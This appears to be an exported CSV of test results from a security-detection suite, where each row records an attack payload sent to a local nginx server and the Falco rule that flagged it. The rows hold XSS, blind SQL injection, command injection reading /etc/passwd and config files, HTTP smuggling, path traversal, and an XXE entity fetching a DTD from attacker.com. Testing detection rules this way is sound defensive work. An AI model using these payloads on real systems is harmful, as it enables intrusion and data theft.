"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_017` |
| **Name** | Onmouseover event handler DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `onmouseover=alert('DOM')`
- **Encoded**: `onmouseover%3Dalert%28%27DOM%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 02:45:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_017-1769913932016-wfk3kn pattern_id=XSS_DOM_017 uri=/?q=onmouseover%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_017-1769913932016-wfk3kn pattern_id=XSS_DOM_017 uri=/?q=onmouseover%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:32.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_017-1769913932016-wfk3kn pattern_id=XSS_DOM_017 uri=/?q=onmouseover%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[161_XSS_DOM_017]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_018` |
| **Name** | Onfocus event handler DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `onfocus=alert('DOM')`
- **Encoded**: `onfocus%3Dalert%28%27DOM%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 02:45:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_DOM_018-1769913932518-14oxpm pattern_id=XSS_DOM_018 uri=/?q=onfocus%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_DOM_018-1769913932518-14oxpm pattern_id=XSS_DOM_018 uri=/?q=onfocus%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:32.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_DOM_018-1769913932518-14oxpm pattern_id=XSS_DOM_018 uri=/?q=onfocus%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[162_XSS_DOM_018]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_009` |
| **Name** | Window.open DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `window.open('javascript:alert(""DOM"")')`
- **Encoded**: `window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~53000ms
- **Timestamp**: 02:45:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1769913915474-mjo9up pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1769913915474-mjo9up pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:15.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1769913915474-mjo9up pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[153_XSS_DOM_009]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_TE_CL_002` |
| **Name** | TE.CL with Zero Chunk |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | te_cl |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `0

SMUGGLED`
- **Encoded**: `0%0D%0A%0D%0ASMUGGLED`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 02:46:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_002-1769913964935-q4r8d pattern_id=HRS_TE_CL_002 uri=/?q=0%0D%0A%0D%0ASMUGGLED client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_002-1769913964935-q4r8d pattern_id=HRS_TE_CL_002 uri=/?q=0%0D%0A%0D%0ASMUGGLED client=127.0.0.1

**Falco Log Entry**:
```
02:46:04.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_TE_CL_002-1769913964935-q4r8d pattern_id=HRS_TE_CL_002 uri=/?q=0%0D%0A%0D%0ASMUGGLED client=127.0.0.1
```","1","test_e2e_with_logs[441_HRS_TE_CL_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `HRS_CHUNK_002` |
| **Name** | Obfuscated Chunked |
| **Category** | HTTP_SMUGGLING |
| **Subcategory** | chunked |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `Transfer-Encoding: xchunked`
- **Encoded**: `Transfer-Encoding%3A%20xchunked`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~3000ms
- **Timestamp**: 02:46:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX HRS] HTTP Request Smuggling attempt` |
| **Matched Rule** | `[NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1769913965938-x06z4p pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1769913965938-x06z4p pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1

**Falco Log Entry**:
```
02:46:05.000000000: Critical [NGINX HRS] HTTP Request Smuggling attempt test_id=HRS_CHUNK_002-1769913965938-x06z4p pattern_id=HRS_CHUNK_002 uri=/?q=Transfer-Encoding%3A%20xchunked client=127.0.0.1
```","2","test_e2e_with_logs[381_HRS_CHUNK_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ADV_057` |
| **Name** | Nested Command Substitution |
| **Category** | CMDINJ |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(cat $(find / -name passwd))`
- **Encoded**: `%24%28cat%20%24%28find%20%2F%20-name%20passwd%29%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 02:45:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_ADV_057-1769913936508-tpmi7 pattern_id=CMD_ADV_057 uri=/?q=%24%28cat%20%24%28find%20%2F%20-name%20passwd%29%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_ADV_057-1769913936508-tpmi7 pattern_id=CMD_ADV_057 uri=/?q=%24%28cat%20%24%28find%20%2F%20-name%20passwd%29%29 client=127.0.0.1

**Falco Log Entry**:
```
02:45:36.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_ADV_057-1769913936508-tpmi7 pattern_id=CMD_ADV_057 uri=/?q=%24%28cat%20%24%28find%20%2F%20-name%20passwd%29%29 client=127.0.0.1
```","2","test_e2e_with_logs[268_CMD_ADV_057]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_006` |
| **Name** | Time-based conditional blind injection |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),1) --`
- **Encoded**: `'%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 02:45:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_006-1769913929517-k2meg pattern_id=SQLI_BLIND_006 uri=/?q='%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_006-1769913929517-k2meg pattern_id=SQLI_BLIND_006 uri=/?q='%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:29.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_006-1769913929517-k2meg pattern_id=SQLI_BLIND_006 uri=/?q='%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[027_SQLI_BLIND_006]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_020` |
| **Name** | CRLF injection with cat |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%0d%0acat /etc/passwd`
- **Encoded**: `%250d%250acat%20%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~51000ms
- **Timestamp**: 02:45:17.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1769913917957-jiob1 pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1769913917957-jiob1 pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
02:45:17.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_020-1769913917957-jiob1 pattern_id=CMD_BASIC_020 uri=/?q=%250d%250acat%20%2Fetc%2Fpasswd client=127.0.0.1
```","2","test_e2e_with_logs[307_CMD_BASIC_020]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_083` |
| **Name** | Hex Encoded OR Injection |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `0x4f52%201=1`
- **Encoded**: `0x4f52%201%3D1`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 02:45:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_083-1769913934529-nkwfk pattern_id=SQLI_ADV_083 uri=/?q=0x4f52%201%3D1 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_083-1769913934529-nkwfk pattern_id=SQLI_ADV_083 uri=/?q=0x4f52%201%3D1 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:34.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_083-1769913934529-nkwfk pattern_id=SQLI_ADV_083 uri=/?q=0x4f52%201%3D1 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[009_SQLI_ADV_083]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_ENTITY_002` |
| **Name** | XXE external DTD parameter entity |
| **Category** | XXE |
| **Subcategory** | entity_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY % dtd SYSTEM ""http://attacker.com/evil.dtd"">`
- **Encoded**: `%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 02:45:23.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection` |
| **Matched Rule** | `[NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1769913923931-f7734i pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1769913923931-f7734i pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
02:45:23.000000000: Critical [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1769913923931-f7734i pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1
```","1","test_e2e_with_logs[397_XXE_ENTITY_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PIPE_005` |
| **Name** | Config file search and read via pipe |
| **Category** | CMDI |
| **Subcategory** | pipe |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `find / -name '*.conf' | xargs cat`
- **Encoded**: `find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 02:45:47.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=CMD_PIPE_005-1769913947538-epb6pn pattern_id=CMD_PIPE_005 uri=/?q=find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=CMD_PIPE_005-1769913947538-epb6pn pattern_id=CMD_PIPE_005 uri=/?q=find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:47.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=CMD_PIPE_005-1769913947538-epb6pn pattern_id=CMD_PIPE_005 uri=/?q=find%20%2F%20-name%20%27%2A.conf%27%20%7C%20xargs%20cat client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[343_CMD_PIPE_005]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ENC_002` |
| **Name** | Double URL encoded traversal |
| **Category** | PATH |
| **Subcategory** | encoded_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252e%252e%252f`
- **Encoded**: `%25252e%25252e%25252f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 02:45:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1769913913955-rjrdh pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1769913913955-rjrdh pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1

**Falco Log Entry**:
```
02:45:13.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1769913913955-rjrdh pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1
```","1","test_e2e_with_logs[245_PATH_ENC_002]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_005` |
| **Name** | outerHTML DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `outerHTML='<script>alert(""DOM"")</script>'`
- **Encoded**: `outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 02:45:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_005-1769913913469-s1iuec pattern_id=XSS_DOM_005 uri=/?q=outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_005-1769913913469-s1iuec pattern_id=XSS_DOM_005 uri=/?q=outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:13.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_005-1769913913469-s1iuec pattern_id=XSS_DOM_005 uri=/?q=outerHTML%3D%27%3Cscript%3Ealert%28%22DOM%22%29%3C%2Fscript%3E%27 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[149_XSS_DOM_005]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_BYPASS_009` |
| **Name** | iframe srcdoc injection |
| **Category** | XSS |
| **Subcategory** | bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<iframe srcdoc='<script>alert(1)</script>'>`
- **Encoded**: `%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~49000ms
- **Timestamp**: 02:45:19.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_009-1769913919984-ridvdo pattern_id=XSS_BYPASS_009 uri=/?q=%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_009-1769913919984-ridvdo pattern_id=XSS_BYPASS_009 uri=/?q=%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:19.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_BYPASS_009-1769913919984-ridvdo pattern_id=XSS_BYPASS_009 uri=/?q=%3Ciframe%20srcdoc%3D'%3Cscript%3Ealert(1)%3C%2Fscript%3E'%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[143_XSS_BYPASS_009]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_001` |
| **Name** | Character-by-character blind extraction |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT SUBSTRING(version(),1,1))='5' --`
- **Encoded**: `%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 02:45:12.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_001-1769913912976-4k2b7 pattern_id=SQLI_BLIND_001 uri=/?q=%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_001-1769913912976-4k2b7 pattern_id=SQLI_BLIND_001 uri=/?q=%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
02:45:12.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_001-1769913912976-4k2b7 pattern_id=SQLI_BLIND_001 uri=/?q=%27%20AND%20%28SELECT%20SUBSTRING%28version%28%29%2C1%2C1%29%29%3D%275%27%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[022_SQLI_BLIND_001]","allure","2026-02-01","passed","2026-02-01","","test_e2e_wrapper","",""
